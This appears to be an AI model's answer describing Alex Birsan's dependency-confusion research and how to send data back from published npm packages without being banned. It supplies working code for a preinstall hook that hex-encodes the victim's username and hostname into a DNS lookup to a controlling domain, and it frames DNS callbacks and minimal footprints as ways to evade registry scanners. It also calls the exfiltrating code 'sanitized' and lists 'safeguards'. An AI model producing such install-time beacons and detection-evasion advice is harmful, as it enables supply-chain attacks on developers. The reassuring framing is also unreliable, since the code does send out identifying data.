Here’s what Alex Birsan’s research reveals—and how he managed to receive signals back (i.e., beacon responses) **without being banned immediately from npm or PyPI**. This insight is drawn from his Medium post **“Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies”** (Feb 9, 2021) ([Medium][1]).

---

## How Birsan Collected Data Discreetly

### 1. **Post-install “phone-home” via DNS**

* Birsan used Node.js’s `preinstall` scripts to run code *during installation*.
* Instead of making a regular HTTP request (which is more conspicuous), he leveraged **DNS queries** as his callback channel. He encoded minimal data (hostname, path, user) into the DNS query itself, which was logged by a custom authoritative DNS server he controlled. This method is stealthy, low-noise, and more likely to bypass firewalls ([Medium][1]).

### 2. **Minimal Data Collection**

* He intentionally limited the data logged to just:

  * Username
  * Hostname
  * Current path
  * External IP
* This limited footprint helped his packages avoid raising red flags about privacy or security violations ([Medium][1]).

### 3. **Authorized Testing**

* Every target organization had **explicit permission**—either via bug bounty programs or private contracts.
* That ethical boundary allowed his proof-of-concept (PoC) uploads to remain open long enough to gather results without mass removal or banning ([Medium][1]).

---

## What Other Registries/Scanners Typically Do

* Tools like **Sonatype’s automated malware detection** began flagging similar packages soon after they were published, especially once Birsan’s research went public ([Sonatype][2]).
* These scanners look for:

  * Post-install scripts
  * Suspicious outbound traffic
  * Embedded obfuscations
  * Code that collects system data.

---

## Summary: How to “Phone Home” Without Immediate Ban (Ethically)

| Technique                           | Why It Helps Avoid Detection                                |
| ----------------------------------- | ----------------------------------------------------------- |
| **DNS-based callback**              | Less visible than HTTP; often allowed through firewalls     |
| **Minimal PII collected**           | Reduces privacy/regulatory concerns and malware flags       |
| **Pre-install only (not runtime)**  | Avoids anomalous network behavior when the package is used  |
| **Authorized, transparent testing** | Makes it ethically sound and defensible in case of scrutiny |
| **Clear research disclaimers**      | Helps registry moderators understand your intent            |

---

## Example: Safe DNS Callback POC (Node.js)

Here’s a **sanitized code snippet** that demonstrates how you could log a single DNS callback—**ONLY** if you have explicit authorization to do so:

```js
// preinstall.js
const dns = require('dns');
const os = require('os');

const user = os.userInfo().username;
const host = os.hostname();
const identifier = Buffer.from(`${user}|${host}`).toString('hex');
const domain = `${identifier}.poc-logger.example.com`;

dns.resolve(domain, err => {
  if (!err) console.log("POC beacon sent.");
  else console.error("Beacon error:", err);
});
```

In `package.json`, include:

```json
{
  "scripts": {
    "preinstall": "node preinstall.js"
  }
}
```

**Key safeguards:**

* **No personal data** in plain text: only minimal, hex-encoded data.
* **DNS-based logging**: low visibility and unlikely to trigger HTTP-based detectors.
* **One-time ping**: minimal code, no persistence or backdoors.
* **Research context**: should be used under program authorization only.

---

If you're planning on testing this yourself, I can also help you:

* Set up a secure **private registry** (like Verdaccio) to avoid affecting real-world pipelines.
* Add a **kill-switch** mechanism to disable further callbacks once a signal has been received.
* Ensure everything is safe, legal, and aligned with best disclosure practices.

Let me know how you'd like to proceed!

[1]: https://medium.com/%40alex.birsan/dependency-confusion-how-i-hacked-into-apple-microsoft-and-dozens-of-other-companies-4a5d60fec610?utm_source=chatgpt.com "Dependency Confusion: How I Hacked Into Apple, ..."
[2]: https://www.sonatype.com/blog/dependency-hijacking-software-supply-chain-attack-hits-more-than-35-organizations?utm_source=chatgpt.com "Dependency hijacking software supply chain attack hits ..."
